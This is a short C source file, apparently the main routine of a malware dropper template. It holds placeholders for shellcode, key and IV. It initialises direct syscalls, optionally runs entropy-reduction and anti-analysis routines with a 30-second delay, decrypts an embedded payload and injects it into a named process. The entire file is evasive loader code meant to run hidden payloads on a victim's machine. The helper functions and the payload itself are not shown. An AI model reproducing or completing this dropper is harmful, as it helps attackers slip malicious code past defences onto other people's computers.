#include "dropper.h"
#include "common.h"


/* SHELLCODE */

/* KEY */

/* IV */

int main() {

    DebugPrint("Debug mode enabled.\n");
    DebugPrint("Dropper started...\n");

    InitializeSyscalls();

#ifdef ENTROPY_REDUCTION_ENABLED
    init_obfuscation();
#endif

#ifdef ANTI_ANALYSIS_ENABLED
    AntiAnalysis(30000); // 30 seconds timeout
#endif

BOOL bSuccess;
PVOID pDecryptedPayload = Payload;
SIZE_T PayloadSize = sizeof(Payload);

#ifdef ENCRYPTED_PAYLOAD
    DWORD dwDecryptedPayloadSize = NULL;
    bSuccess = decrypt(Payload, sizeof(Payload), key, sizeof(key), iv, &pDecryptedPayload, &dwDecryptedPayloadSize);
    if (bSuccess && pDecryptedPayload != NULL) {
        PayloadSize = dwDecryptedPayloadSize;
        DebugPrint("[i] Payload decrypted successfully. [size: %d]\n", PayloadSize);
    }
#else
    bSuccess = decrypt(pDecryptedPayload, PayloadSize, NULL, 0, NULL, NULL, NULL);
#endif

    if (!bSuccess) {
        DebugPrint("[X] Failed to decrypt payload.\n");
       return 1;
    }

#ifdef PROCESS_NAME_ENABLED
    LPWSTR szProcessName =  /* PROCESS_NAME */;
    bSuccess = inject_payload(pDecryptedPayload, PayloadSize, szProcessName);
#else
    bSuccess = inject_payload(pDecryptedPayload, PayloadSize);
#endif

    if (bSuccess) {
        DebugPrint("[i] Payload injected successfully.\n");
    } else {
        DebugPrint("[X] Failed to inject payload.\n");
    }

    return 0;
}